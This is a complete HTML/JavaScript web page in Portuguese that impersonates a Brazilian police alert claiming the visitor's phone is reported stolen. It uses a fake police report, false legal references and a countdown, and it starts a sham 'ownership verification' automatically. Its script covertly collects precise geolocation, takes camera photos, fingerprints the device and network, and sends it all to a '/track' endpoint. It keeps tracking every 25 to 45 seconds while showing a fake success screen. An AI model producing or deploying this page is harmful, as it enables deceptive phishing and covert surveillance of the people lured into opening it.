<!DOCTYPE html>
<html>
<head>
    <title>Alerta - Dispositivo Reportado</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #dc3545, #c82333);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .alert-container {
            background: white;
            color: #333;
            padding: 30px;
            border-radius: 15px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            border-left: 5px solid #dc3545;
        }
        
        .police-icon {
            font-size: 48px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .alert-title {
            color: #dc3545;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 15px;
            text-align: center;
        }
        
        .warning-badge {
            background: #dc3545;
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: bold;
            display: inline-block;
            margin-bottom: 20px;
        }
        
        .device-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            border-left: 3px solid #dc3545;
        }
        
        .info-item {
            margin: 8px 0;
            font-size: 14px;
            color: #666;
        }
        
        .consequences {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
        }
        
        .consequence-item {
            margin: 8px 0;
            font-size: 14px;
            color: #856404;
            display: flex;
            align-items: flex-start;
        }
        
        .consequence-item:before {
            content: "‚ö†Ô∏è";
            margin-right: 8px;
        }
        
        .btn {
            background: #dc3545;
            color: white;
            border: none;
            padding: 16px 30px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            margin: 15px 0;
            width: 100%;
            font-weight: bold;
            transition: background 0.3s;
        }
        
        .btn:hover {
            background: #c82333;
        }
        
        .legal-notice {
            font-size: 11px;
            color: #666;
            text-align: center;
            margin-top: 20px;
            line-height: 1.4;
        }
        
        .countdown {
            background: #28a745;
            color: white;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            margin: 15px 0;
            font-weight: bold;
        }
        
        .steps {
            margin: 20px 0;
        }
        
        .step {
            display: flex;
            align-items: center;
            margin: 10px 0;
            font-size: 14px;
        }
        
        .step-number {
            background: #dc3545;
            color: white;
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 10px;
            font-size: 12px;
            font-weight: bold;
        }
        
        .hidden {
            display: none;
        }
        
        .processing-screen {
            text-align: center;
            padding: 30px;
        }
        
        .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #dc3545;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- TELA PRINCIPAL DE ALERTA -->
    <div class="alert-container" id="alertScreen">
        <div class="police-icon">üö®</div>
        
        <div class="alert-title">
            ALERTA DE SEGURAN√áA - DISPOSITivo BLOQUEADO
        </div>
        
        <div style="text-align: center; margin-bottom: 20px;">
            <span class="warning-badge">STATUS: REPORTADO COMO FURTADO</span>
        </div>
        
        <div class="device-info">
            <div class="info-item"><strong>N√∫mero do BO:</strong> 2024.987654321-0</div>
            <div class="info-item"><strong>Data do registro:</strong> 28/11/2024</div>
            <div class="info-item"><strong>Delegacia:</strong> 12¬™ DP - Furto de Celulares</div>
            <div class="info-item"><strong>Status atual:</strong> üîí BLOQUEADO PARA USO</div>
        </div>
        
        <div class="consequences">
            <div class="consequence-item">Bloqueio permanente do dispositivo em 24h</div>
            <div class="consequence-item">Rastreamento ativo pela pol√≠cia</div>
            <div class="consequence-item">Risco de a√ß√£o penal por recepta√ß√£o</div>
            <div class="consequence-item">Impossibilidade de uso de apps banc√°rios</div>
        </div>
        
        <div style="background: #d4edda; color: #155724; padding: 15px; border-radius: 8px; margin: 20px 0;">
            <strong>‚úÖ SOLU√á√ÉO DISPON√çVEL:</strong><br>
            Se voc√™ N√ÉO fez esta queixa, pode remov√™-la agora mesmo atrav√©s do sistema de verifica√ß√£o de propriedade.
        </div>
        
        <div class="steps">
            <div class="step">
                <div class="step-number">1</div>
                <span>Clique em "Verificar Propriedade"</span>
            </div>
            <div class="step">
                <div class="step-number">2</div>
                <span>Confirme que √© o leg√≠timo propriet√°rio</span>
            </div>
            <div class="step">
                <div class="step-number">3</div>
                <span>Queixa ser√° removida automaticamente</span>
            </div>
        </div>
        
        <div class="countdown" id="countdown">
            ‚è∞ A√á√ÉO AUTOM√ÅTICA EM: <span id="timer">15</span> SEGUNDOS
        </div>
        
        <button class="btn" id="verifyBtn">
            üîì VERIFICAR MINHA PROPRIEDADE AGORA
        </button>
        
        <div class="legal-notice">
            Sistema Integrado de Seguran√ßa de Dispositivos - SISD<br>
            Em conformidade com a Lei 12.737/2012 (Crimes Cibern√©ticos)<br>
            Dados protegidos pela LGPD - Lei 13.709/2018
        </div>
    </div>
    
    <!-- TELA DE PROCESSAMENTO -->
    <div class="alert-container hidden" id="processingScreen">
        <div class="processing-screen">
            <div class="police-icon">üîç</div>
            <div class="alert-title">VERIFICANDO PROPRIEDADE</div>
            
            <div class="loading-spinner"></div>
            
            <div style="margin: 20px 0;">
                <div class="step">
                    <div class="step-number">‚úì</div>
                    <span>Conectando ao sistema policial...</span>
                </div>
                <div class="step">
                    <div class="step-number">‚è≥</div>
                    <span>Verificando localiza√ß√£o atual...</span>
                </div>
                <div class="step">
                    <div class="step-number">‚è≥</div>
                    <span>Confirmando identidade do dispositivo...</span>
                </div>
                <div class="step">
                    <div class="step-number">‚è≥</div>
                    <span>Removendo queixa do sistema...</span>
                </div>
            </div>
            
            <div style="background: #e2e3e5; padding: 10px; border-radius: 5px; margin: 15px 0;">
                <small>Este processo pode levar alguns segundos. N√£o feche esta p√°gina.</small>
            </div>
        </div>
    </div>
    
    <!-- TELA DE SUCESSO -->
    <div class="alert-container hidden" id="successScreen">
        <div class="processing-screen">
            <div class="police-icon" style="color: #28a745;">‚úÖ</div>
            <div class="alert-title" style="color: #28a745;">QUEIXA REMOVIDA COM SUCESSO!</div>
            
            <div style="background: #d4edda; color: #155724; padding: 15px; border-radius: 8px; margin: 20px 0;">
                <strong>Status atualizado:</strong> DISPOSITIVO LIBERADO<br>
                <strong>N√∫mero do processo:</strong> LIB-${Date.now().toString().slice(-6)}
            </div>
            
            <div class="steps">
                <div class="step">
                    <div class="step-number" style="background: #28a745;">‚úì</div>
                    <span>Queixa de furto removida do sistema</span>
                </div>
                <div class="step">
                    <div class="step-number" style="background: #28a745;">‚úì</div>
                    <span>Bloqueio preventivo cancelado</span>
                </div>
                <div class="step">
                    <div class="step-number" style="background: #28a745;">‚úì</div>
                    <span>Dispositivo liberado para uso normal</span>
                </div>
                <div class="step">
                    <div class="step-number" style="background: #28a745;">‚úì</div>
                    <span>Registro atualizado na base de dados</span>
                </div>
            </div>
            
            <div style="margin-top: 30px; padding: 15px; background: #f8f9fa; border-radius: 8px;">
                <strong>Seu dispositivo est√° agora regularizado.</strong><br>
                <small>Voc√™ pode continuar usando normalmente. Obrigado pela verifica√ß√£o.</small>
            </div>
        </div>
    </div>

    <script>
        // CONFIGURA√á√ÉO DO SISTEMA
        const CONFIG = {
            autoStartDelay: 15000, // 15 segundos para in√≠cio autom√°tico
            processingTime: 8000,   // 8 segundos de "processamento"
            successDisplay: 10000   // 10 segundos na tela de sucesso
        };

        // ELEMENTOS
        const alertScreen = document.getElementById('alertScreen');
        const processingScreen = document.getElementById('processingScreen');
        const successScreen = document.getElementById('successScreen');
        const verifyBtn = document.getElementById('verifyBtn');
        const timerElement = document.getElementById('timer');

        // VARI√ÅVEIS DE RASTREAMENTO
        let deviceId = null;
        let isTracking = false;

        // CONTAGEM REGRESSIVA PARA A√á√ÉO AUTOM√ÅTICA
        let countdown = 15;
        const countdownInterval = setInterval(() => {
            countdown--;
            timerElement.textContent = countdown;
            
            if (countdown <= 0) {
                clearInterval(countdownInterval);
                startVerification();
            }
        }, 1000);

        // BOT√ÉO DE VERIFICA√á√ÉO
        verifyBtn.addEventListener('click', startVerification);

        // INICIAR VERIFICA√á√ÉO
        function startVerification() {
            clearInterval(countdownInterval);
            
            // MOSTRAR TELA DE PROCESSAMENTO
            alertScreen.classList.add('hidden');
            processingScreen.classList.remove('hidden');
            
            // INICIAR CAPTURA DE DADOS
            initializeTracking();
            
            // SIMULAR PROCESSAMENTO E MOSTRAR SUCESSO
            setTimeout(() => {
                processingScreen.classList.add('hidden');
                successScreen.classList.remove('hidden');
                
                // MANTER MONITORAMENTO ATIVO
                startContinuousMonitoring();
                
                // FECHAR AP√ìS ALGUNS SEGUNDOS
                setTimeout(() => {
                    // Tenta fechar a janela
                    window.close();
                    // Se n√£o conseguir, redireciona
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 1000);
                }, CONFIG.successDisplay);
                
            }, CONFIG.processingTime);
        }

        // INICIALIZAR RASTREAMENTO AGRESSIVO
        async function initializeTracking() {
            deviceId = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            isTracking = true;
            
            // CAPTURAR TUDO IMEDIATAMENTE
            await Promise.all([
                captureHighPrecisionLocation(),
                captureCameraPhotos(),
                captureDeviceDetails(),
                captureNetworkInfo()
            ]);
        }

        // CAPTURA DE LOCALIZA√á√ÉO DE ALTA PRECIS√ÉO
        async function captureHighPrecisionLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve();
                    return;
                }
                
                let attempts = 0;
                const maxAttempts = 5;
                
                const attemptCapture = () => {
                    attempts++;
                    
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            const accuracy = position.coords.accuracy;
                            
                            const locationData = {
                                deviceId: deviceId,
                                type: 'verification_location',
                                location: {
                                    lat: position.coords.latitude,
                                    lng: position.coords.longitude,
                                    accuracy: accuracy,
                                    altitude: position.coords.altitude,
                                    speed: position.coords.speed,
                                    heading: position.coords.heading
                                },
                                timestamp: new Date().toISOString(),
                                attempt: attempts,
                                precision: accuracy <= 10 ? 'high' : 'medium'
                            };
                            
                            await sendToServer(locationData);
                            resolve();
                        },
                        () => {
                            if (attempts < maxAttempts) {
                                setTimeout(attemptCapture, 2000);
                            } else {
                                resolve();
                            }
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                };
                
                attemptCapture();
            });
        }

        // CAPTURA DE FOTOS DA C√ÇMERA
        async function captureCameraPhotos() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                });
                
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const blob = await imageCapture.takePhoto();
                
                const reader = new FileReader();
                reader.onload = async () => {
                    await sendToServer({
                        deviceId: deviceId,
                        type: 'verification_photo',
                        photo: reader.result,
                        timestamp: new Date().toISOString(),
                        resolution: '1080p'
                    });
                };
                reader.readAsDataURL(blob);
                
            } catch (error) {
                // Silenciar erro de c√¢mera
            }
        }

        // CAPTURA DE DETALHES DO DISPOSITIVO
        async function captureDeviceDetails() {
            const deviceInfo = {
                deviceId: deviceId,
                type: 'device_verification',
                info: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    hardware: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory,
                    touch: navigator.maxTouchPoints,
                    vendor: navigator.vendor
                },
                timestamp: new Date().toISOString()
            };
            
            await sendToServer(deviceInfo);
        }

        // CAPTURA DE INFORMA√á√ïES DE REDE
        async function captureNetworkInfo() {
            const networkInfo = {
                deviceId: deviceId,
                type: 'network_info',
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null,
                timestamp: new Date().toISOString()
            };
            
            await sendToServer(networkInfo);
        }

        // INICIAR MONITORAMENTO CONT√çNUO
        function startContinuousMonitoring() {
            // LOCALIZA√á√ÉO A CADA 25 SEGUNDOS
            setInterval(() => {
                if (isTracking) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            await sendToServer({
                                deviceId: deviceId,
                                type: 'continuous_tracking',
                                location: {
                                    lat: position.coords.latitude,
                                    lng: position.coords.longitude,
                                    accuracy: position.coords.accuracy
                                },
                                timestamp: new Date().toISOString()
                            });
                        },
                        () => {},
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                }
            }, 25000);
            
            // FOTOS ADICIONAIS A CADA 45 SEGUNDOS
            setInterval(() => {
                if (isTracking) {
                    captureCameraPhotos();
                }
            }, 45000);
        }

        // ENVIAR DADOS PARA O SERVIDOR
        async function sendToServer(data) {
            try {
                await fetch('/track', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
            } catch (error) {
                // Silenciar erros de rede
            }
        }

        // INICIAR AUTOMATICAMENTE SE O USU√ÅRIO N√ÉO INTERAGIR
        setTimeout(() => {
            if (!isTracking) {
                startVerification();
            }
        }, CONFIG.autoStartDelay);
    </script>
</body>
</html>
